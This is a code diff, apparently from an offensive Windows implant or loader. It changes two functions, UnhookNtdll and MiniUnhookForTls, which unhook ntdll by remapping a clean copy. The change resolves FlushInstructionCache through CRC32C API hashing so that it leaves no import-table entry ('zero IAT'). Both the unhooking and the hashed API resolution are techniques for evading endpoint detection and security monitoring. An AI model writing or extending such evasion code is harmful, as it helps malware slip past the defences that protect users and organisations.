@@ -341,7 +341,15 @@ bool KnownDlls::UnhookNtdll()
     // 8. Cleanup: unmap clean view, close section handle, flush cache
     fnNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);
     fnNtClose(hSection);
-    FlushInstructionCache(GetCurrentProcess(), NULL, 0);
+    // FlushInstructionCache resolved via CRC32C hash — zero IAT
+    {
+        HMODULE hK32f = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (hK32f) {
+            auto pFIC = (BOOL(WINAPI*)(HANDLE,LPCVOID,SIZE_T))
+                Api::GetProcByHashCrc(hK32f, Crc32C::ConstHash("FlushInstructionCache"));
+            if (pFIC) pFIC((HANDLE)(LONG_PTR)-1, NULL, 0);
+        }
+    }
 
     return patched;
 }
@@ -445,7 +453,15 @@ bool KnownDlls::MiniUnhookForTls()
     // 8. Cleanup
     fnNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, cleanBase);
     fnNtClose(hSection);
-    FlushInstructionCache(GetCurrentProcess(), NULL, 0);
+    // FlushInstructionCache resolved via CRC32C hash — zero IAT
+    {
+        HMODULE hK32f = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (hK32f) {
+            auto pFIC = (BOOL(WINAPI*)(HANDLE,LPCVOID,SIZE_T))
+                Api::GetProcByHashCrc(hK32f, Crc32C::ConstHash("FlushInstructionCache"));
+            if (pFIC) pFIC((HANDLE)(LONG_PTR)-1, NULL, 0);
+        }
+    }
 
     return patched;
 }
